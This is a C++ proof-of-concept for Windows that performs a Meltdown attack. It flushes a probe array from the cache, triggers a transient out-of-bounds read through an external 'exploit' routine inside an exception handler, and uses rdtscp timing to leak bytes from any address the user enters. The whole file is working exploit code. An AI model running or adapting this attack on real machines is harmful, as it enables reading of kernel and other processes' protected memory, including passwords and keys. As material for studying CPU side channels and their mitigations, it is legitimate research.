#include <iostream>
#include <windows.h>
#include <intrin.h>
#define PAGE_SIZE 4096

extern "C" void exploit(uintptr_t addr, void* array);
uint16_t timearr[256];

uint16_t Probe(uintptr_t addr, void* arr) {
	
	uint16_t leak = 0xFFFF;
	uint64_t minTime = 0xFF;

	// Clear cache
	for (size_t i = 0; i < 256; i++) {
		_mm_clflush(&reinterpret_cast<byte*>(arr)[i * PAGE_SIZE]);
	}
	
	// Using Exception Handler
	__try {
		exploit(addr, arr);
	}
	__except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION) {
		// An access violation is expected.
	}
	
	for (size_t i = 1; i < 256; i++) {
		uint32_t avx;
		uint64_t t1 = __rdtscp(&avx);
		uint8_t junk = ((byte*)arr)[i * PAGE_SIZE];
		//junk = rand() & 0xFF;  // A function to ensure that CPU won't run __rdtsc below out-of-order.
		uint64_t t2 = __rdtscp(&avx);
		timearr[i] = t2 - t1;
	}

	for (int i = 1; i < 256; i++) {
		if (timearr[i] < minTime) {
			minTime = timearr[i];
			leak = i;
		}
	}

	//std::cout << std::endl;
	if (minTime <= 100) {
		return leak;
	}
	return 0xFFFF; // highest byte indicate error
}

uint8_t MeltdownExtractOne(uintptr_t addr, void* arr) {
	size_t tryed = 0;

	do {
		uint16_t leak = Probe(addr, arr);
		if (!(leak & 0xFF00)) { // No Error
			return leak;
		}
		tryed++;
		_mm_pause();
	} while (tryed <= 99999); // Zzzzzzzzz
	
	return 0;
}

int main() {
	uintptr_t addr;
	size_t size;
	uintptr_t junk;
	SetProcessAffinityMask(GetCurrentProcess(), 1);
	void* arr = malloc(PAGE_SIZE * 256);

	printf("Meltdown demo.\nEnter any address in hexadecimal to leak data : ");
	scanf_s("0x%p", &addr);
	printf("Size: ");
	scanf_s("%ul", &size);

	putchar('\n');
	for (size_t i = 0; i < size; i++) {
		unsigned int retn = MeltdownExtractOne(addr + i, arr);
		printf("%02X", retn);
	}

	free(arr);

	return 0;
}